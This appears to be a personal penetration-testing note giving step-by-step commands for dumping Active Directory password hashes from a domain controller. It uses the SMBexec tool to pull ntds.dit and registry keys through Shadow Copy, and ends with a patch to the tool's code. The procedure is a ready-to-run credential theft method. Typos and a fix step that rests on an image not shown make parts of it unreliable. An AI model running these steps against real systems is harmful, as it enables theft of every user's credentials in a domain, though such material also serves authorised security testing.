The user hashes is stored in a database called ntds.net

We will gather user hashes using the tool **SMBexec**.
This application is made to grab the sysreg jeys and ntds.dit file using the Shadow Copy functionality.

- Download it:
````
git clone https://github.com/brav0hax/smbexec.git
````
- Do this:
````
cd smbexec/

sudo ./install.sh

#select 1

#press Enter to install to the /opt
````
- Execute it:
````
cd /opt/smbexec

./smbexec.rb

#select number 3 to obtain the hashes

#choose number 1

#fill the values
````
- If the file cracked is **empty** do this:
	- Maybe you'll get the error `[!] Error! syshive not specified!`
	- The tool responsible for this is **ntdsextract** and **smbexec** is bugged
	- Go to the route /opt/smbexec/lib/modules/hasdump
	- Edit the file called hashesdc.rb
	- Change to this:
	![[dsusers.png]]
	- Now repeat the initial process and it should work :)
	- Whe have found the passwords dumped and the system controller.-